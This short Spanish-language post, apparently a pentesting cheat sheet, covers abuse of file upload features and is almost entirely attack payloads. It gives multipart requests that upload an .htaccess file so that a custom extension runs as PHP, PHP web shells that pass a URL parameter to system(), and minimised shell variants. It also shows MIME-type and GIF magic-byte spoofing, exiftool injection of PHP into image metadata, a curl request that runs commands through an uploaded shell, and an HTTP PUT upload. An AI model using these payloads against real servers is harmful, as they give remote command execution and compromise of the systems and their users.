---
title: 'File upload abuse'
description: 'Hay muchas maneras en que se puede abusar de las cargas de archivos el las aplicaciónes.'
pubDate: 'Jul 08 2022'
slug: 'trip/file_upload_abuse'

---

## .htaccess

```bash
Content-Type: multipart/form-data; boundary=---------------------------376986183714055427691921862140
-----------------------------376986183714055427691921862140
Content-Disposition: form-data; name="toConvert"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .test

-----------------------------376986183714055427691921862140--

# Luego subimos el archivo pwn

Content-Type: multipart/form-data; boundary=---------------------------376986183714055427691921862140
-----------------------------376986183714055427691921862140
Content-Disposition: form-data; name="toConvert"; filename="pwn.test"
Content-Type: text/plain

<?php
  system($_GET['cmd']);
?>

-----------------------------376986183714055427691921862140--

```

## caracteres maximos

```bash
<?php system($_GET['c']); ?>
<?php system($_GET[0 ]); ?>
<?= exec($_GET[0]; ?)>
<?=`$_GET[0]`?>

```

## Tipos de archivos

```bash
Content-Disposition: form-data; name="fileToUpload"; filename='pwn.php'
#Content-Type: application/x-php
Content-Type: image/jpg

<?php system($_GET['c']); ?>

## ##
file cmd.php
# archivo php

## ##
Content-Type: image/gif

GIF8;

<?php system($_GET['c']); ?>

file cmd.php
# ahora cambia a archivo GIF8

xxd cmd.php
#GIF

## ##

curl -s -X GET "http://files.com/uploads/pwd.php" -G --data-urlencode "cmd=id"

```

## Metadatos

```bash
exiftool -Comment='<?php system("id"); ?>' foto.gif

```

usando *nc* podemos conectarnos .

```bash
nc google.com
OPTIONS / HTTP/1.1

#######
# importante usar: content length, el contenido real del archivo se encuentra en la carga útil de la solicitud

PUT /writable_dir/index.hmtl HTTP/1.1
Content-length: 299
```